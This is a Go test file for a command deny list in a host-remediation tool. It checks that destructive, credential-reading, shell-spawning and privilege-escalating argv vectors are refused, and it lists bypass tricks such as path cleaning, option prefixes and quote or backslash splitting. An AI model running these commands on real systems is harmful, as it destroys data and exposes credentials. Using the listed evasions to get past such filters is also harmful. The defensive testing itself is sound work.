package hostexec_test

import (
	"strings"
	"testing"

	"github.com/Jaydee94/remedy/internal/hostexec"
)

func TestNeverListRefuses(t *testing.T) {
	cases := map[string][]string{
		"mkfs":                         {"mkfs.ext4", "/dev/sdb"},
		"mkfs by path":                 {"/sbin/mkfs", "/dev/sdb"},
		"dd onto a device":             {"dd", "if=/dev/zero", "of=/dev/sda"},
		"rm -rf /":                     {"rm", "-rf", "/"},
		"rm -r on a system path":       {"rm", "-r", "/etc/foo"},
		"rm -fr on /var":               {"rm", "-fr", "/var/lib/docker"},
		"rm --recursive":               {"rm", "--recursive", "/usr/lib"},
		"rm with no-preserve-root":     {"rm", "-rf", "--no-preserve-root", "/"},
		"rm -rf /*":                    {"rm", "-rf", "/*"},
		"chmod -R on /etc":             {"chmod", "-R", "777", "/etc"},
		"chown -R on /home":            {"chown", "-R", "x", "/home/u"},
		"wipefs":                       {"wipefs", "-a", "/dev/sda"},
		"fdisk":                        {"fdisk", "/dev/sda"},
		"parted":                       {"parted", "/dev/sda", "mklabel", "gpt"},
		"shred":                        {"shred", "/dev/sda"},
		"sh":                           {"sh", "-c", "id"},
		"bash alone":                   {"bash"},
		"zsh":                          {"zsh", "-c", "id"},
		"fish":                         {"fish", "-c", "id"},
		"python -c":                    {"python3", "-c", "print(1)"},
		"python3.12 -c":                {"python3.12", "-c", "print(1)"},
		"perl -e":                      {"perl", "-e", "1"},
		"perl -wle":                    {"perl", "-wle", "1"},
		"ruby -e":                      {"ruby", "-e", "1"},
		"node -e":                      {"node", "-e", "1"},
		"php -r":                       {"php", "-r", "1;"},
		"awk":                          {"awk", `BEGIN{system("id")}`},
		"eval":                         {"eval", "x"},
		"curl -o":                      {"curl", "-o", "/tmp/x", "http://a"},
		"curl -sSo":                    {"curl", "-sSo", "/tmp/x", "http://a"},
		"curl upload":                  {"curl", "-T", "/etc/passwd", "http://a"},
		"wget -O":                      {"wget", "-O", "/tmp/x", "http://a"},
		"shutdown":                     {"shutdown", "-h", "now"},
		"reboot by path":               {"/usr/sbin/reboot"},
		"poweroff":                     {"poweroff"},
		"halt":                         {"halt"},
		"init 0":                       {"init", "0"},
		"systemctl reboot":             {"systemctl", "reboot"},
		"systemctl poweroff":           {"systemctl", "poweroff"},
		"systemctl stop sshd":          {"systemctl", "stop", "sshd"},
		"systemctl mask ssh.service":   {"systemctl", "mask", "ssh.service"},
		"systemctl disable ssh.socket": {"systemctl", "disable", "ssh.socket"},
		"iptables":                     {"iptables", "-F"},
		"nft":                          {"nft", "flush", "ruleset"},
		"ufw":                          {"ufw", "disable"},
		"ssh":                          {"ssh", "other"},
		"scp":                          {"scp", "a", "b:"},
		"rsync":                        {"rsync", "-a", "a", "b:"},
		"nc":                           {"nc", "-e", "/bin/sh", "h", "1"},
		"find -exec":                   {"find", ".", "-exec", "rm", "{}", ";"},
		"find -execdir":                {"find", ".", "-execdir", "x", ";"},
		"xargs":                        {"xargs", "rm"},
		"docker run":                   {"docker", "run", "-v", "/:/h", "alpine"},
		"docker run behind an option":  {"docker", "--host", "tcp://x", "run", "a"},
		"docker exec":                  {"docker", "exec", "c", "id"},
		"docker cp":                    {"docker", "cp", "c:/etc/shadow", "."},
		"docker compose run":           {"docker", "compose", "run", "x"},
		"sudo rm -rf /":                {"sudo", "rm", "-rf", "/"},
		"sudo -u root dd":              {"sudo", "-u", "root", "dd", "of=/dev/sda"},
		"env sh -c":                    {"env", "sh", "-c", "x"},
		"env with assignment":          {"env", "A=b", "sh"},
		"nohup dd":                     {"nohup", "dd", "of=/dev/sda"},
		"timeout reboot":               {"timeout", "5", "reboot"},
		"tee authorized_keys":          {"tee", "/home/u/.ssh/authorized_keys"},
		"cp onto sudoers.d":            {"cp", "x", "/etc/sudoers.d/remedy"},
		"sed -i passwd":                {"sed", "-i", "s/a/b/", "/etc/passwd"},
		"cat shadow":                   {"cat", "/etc/shadow"},
		"sshd_config":                  {"vi", "/etc/ssh/sshd_config"},
		"useradd":                      {"useradd", "x"},
		"usermod":                      {"usermod", "-aG", "sudo", "x"},
		"passwd":                       {"passwd", "root"},
		"visudo":                       {"visudo"},
	}
	for name, argv := range cases {
		if why := hostexec.NeverReason(argv); why == "" {
			t.Errorf("%s: %q is allowed, want it refused", name, argv)
		}
	}
}

func TestNeverListLetsOrdinaryChangesThrough(t *testing.T) {
	for _, argv := range [][]string{
		{"docker", "restart", "remedy-drill"},
		{"docker", "stop", "remedy-a"},
		{"docker", "start", "remedy-a"},
		{"systemctl", "restart", "node_exporter.service"},
		{"systemctl", "restart", "ssh"}, // a restart keeps the access
		{"systemctl", "status", "ssh.service"},
		{"systemctl", "stop", "node_exporter.service"},
		{"rm", "/tmp/remedy-test"},
		{"rm", "-r", "/tmp/remedy-test"},
		{"rm", "-rf", "/tmp"},
		{"ls", "-la", "/tmp"},
		{"cat", "/tmp/x"},
		{"python3", "/opt/script.py"}, // a script file, not code from a string
		{"curl", "-sS", "http://localhost:8080/healthz"},
		{"journalctl", "-u", "x.service"},
		{"apt", "update"},
		{"chmod", "600", "/tmp/x"},
		{"chmod", "-R", "700", "/tmp/dir"},
	} {
		if why := hostexec.NeverReason(argv); why != "" {
			t.Errorf("%q is refused (%s), want it allowed", argv, why)
		}
	}
}

// TestNeverListFalsePositivesAreKnown pins what the list gets wrong on purpose: it looks at every word as a possible
// program, so a container or unit that is named like a dangerous program is refused. The direction is safe, and the
// maintainer can rename the container; a test keeps the behaviour from changing by accident.
func TestNeverListFalsePositivesAreKnown(t *testing.T) {
	for _, argv := range [][]string{
		{"docker", "restart", "sh"},
		{"docker", "stop", "run"},
		{"docker", "start", "reboot"},
	} {
		if why := hostexec.NeverReason(argv); why == "" {
			t.Errorf("%q is allowed; the false positive is documented and expected", argv)
		}
	}
}

// TestNeverListReviewGaps pins the gaps a review found: paths that name a protected or system place only after cleaning,
// long options given by a prefix, commands inside one string word, root shells through sudo, su, doas, nsenter and chroot.
func TestNeverListReviewGaps(t *testing.T) {
	refused := map[string][]string{
		"rm dot-dot onto /etc":        {"rm", "-rf", "/tmp/../etc"},
		"rm double slash onto /etc":   {"rm", "-rf", "//etc"},
		"chmod dot-dot onto /etc":     {"chmod", "-R", "777", "/tmp/../etc"},
		"protected file with ./":      {"chmod", "644", "/etc/./shadow"},
		"protected file with //":      {"chmod", "644", "/etc//shadow"},
		"rm long option prefix":       {"rm", "--rec", "/etc/x"},
		"curl long option prefix":     {"curl", "--out", "/tmp/x", "http://a"},
		"curl long option with =":     {"curl", "--output=/tmp/x", "http://a"},
		"rm no-preserve-root prefix":  {"rm", "--no-pre", "-rf", "/"},
		"su -c with a shell string":   {"su", "-c", "sh -c id"},
		"su root -c with rm in it":    {"su", "root", "-c", "rm -rf /"},
		"env -S with a shell string":  {"env", "-S", "sh -c id"},
		"sudo -s":                     {"sudo", "-s"},
		"sudo -i":                     {"sudo", "-i"},
		"sudo -e a file":              {"sudo", "-e", "/etc/hosts"},
		"sudo --shell prefix":         {"sudo", "--sh"},
		"sudo -u root then -i":        {"sudo", "-u", "root", "-i"},
		"nsenter into pid 1":          {"nsenter", "-t", "1", "-a"},
		"chroot /":                    {"chroot", "/"},
		"doas alone":                  {"doas"},
		"doas with a command":         {"doas", "systemctl", "restart", "x"},
		"su alone":                    {"su"},
		"su - (a login shell)":        {"su", "-"},
		"ssh with a bare argument":    {"ssh", "x"},
		"systemctl restart ssh -q":    {"systemctl", "restart", "ssh", "-q"}, // a known false positive: the word ssh has arguments after it
		"su root -c uptime":           {"su", "root", "-c", "uptime"},        // su is refused always: its -c runs a shell string
		"su -c with ;sh":              {"su", "-c", "id;sh"},
		"su -c with ;rm -rf /":        {"su", "-c", "id;rm -rf /"},
		"su -c with &&sh":             {"su", "-c", "true&&sh"},
		"su -c with |sh":              {"su", "-c", "id|sh"},
		"su -c with $(sh)":            {"su", "-c", "$(sh)"},
		"su -c with (sh)":             {"su", "-c", "(sh)"},
		"su -c with backtick sh":      {"su", "-c", "`sh`"},
		"su -c id":                    {"su", "-c", "id"},
		"env -S":                      {"env", "-S", "x"},
		"env -iS (cluster)":           {"env", "-iS", "x"},
		"env --split-string=":         {"env", "--split-string=x"},
		"env --sp prefix":             {"env", "--sp", "x"},
		"doas -u root id":             {"doas", "-u", "root", "id"},
		"env --s x":                   {"env", "--s", "x"},
		"env --s with SHELL":          {"env", "--s", "${SHELL}"},
		"watch b\\ash (backslash)":    {"watch", "b\\ash -c id"},
		"sudo -n b\\ash":              {"sudo", "-n", "b\\ash"},
		"nohup ba\"sh (quotes)":       {"nohup", "ba\"sh"},
		"nohup r\\m (joined name rm)": {"nohup", "r\\m", "-rf", "/"},
	}
	for name, argv := range refused {
		if why := hostexec.NeverReason(argv); why == "" {
			t.Errorf("%s: %q is allowed, want it refused", name, argv)
		}
	}
	allowed := [][]string{
		{"systemctl", "restart", "ssh"},   // a restart keeps the access
		{"echo", "hello world"},           // a word with a space is only data
		{"env", "-i", "FOO=1", "uptime"},  // env without -S is not refused
		{"chmod", "644", "/tmp/dir/../x"}, // cleaned, it stays under /tmp
	}
	for _, argv := range allowed {
		if why := hostexec.NeverReason(argv); why != "" {
			t.Errorf("%q is refused (%s), want it allowed", argv, why)
		}
	}
}

func TestEveryRefusalSaysWhy(t *testing.T) {
	why := hostexec.NeverReason([]string{"rm", "-rf", "/"})
	if why == "" || strings.HasSuffix(why, ".") || strings.ContainsAny(why, "\n") {
		t.Fatalf("reason = %q, want one short sentence without a final period", why)
	}
}
